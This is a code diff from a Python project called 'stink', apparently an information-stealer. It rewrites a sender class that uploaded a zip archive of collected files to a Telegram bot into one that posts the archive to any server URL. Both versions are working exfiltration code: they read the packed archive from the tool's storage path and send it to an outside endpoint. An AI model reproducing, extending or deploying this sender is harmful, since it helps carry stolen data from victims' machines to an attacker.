@@ -5,24 +5,22 @@ from stink.helpers import MultipartFormDataEncoder
 from stink.utils.senders.abstract import AbstractSender
 
 
-class TelegramSender(AbstractSender):
+class ServerSender(AbstractSender):
 
-    def __init__(self, token: str, user_id: int):
+    def __init__(self, server: str):
         super().__init__()
 
-        self.__token = token
-        self.__user_id = user_id
+        self.__server = server
 
     def __get_sender_data(self):
 
         with open(rf"{path.dirname(self.__storage_path)}\{self.__zip_name}.zip", "rb") as file:
-
             content_type, body = MultipartFormDataEncoder(self.__errors).encode(
-                [("chat_id", self.__user_id)],
+                [],
                 [("document", f"{self.__zip_name}.zip", file)]
             )
 
-            return content_type, body, f"https://api.telegram.org/bot{self.__token}/sendDocument"
+            return content_type, body, self.__server
 
     def __send_archive(self):
 
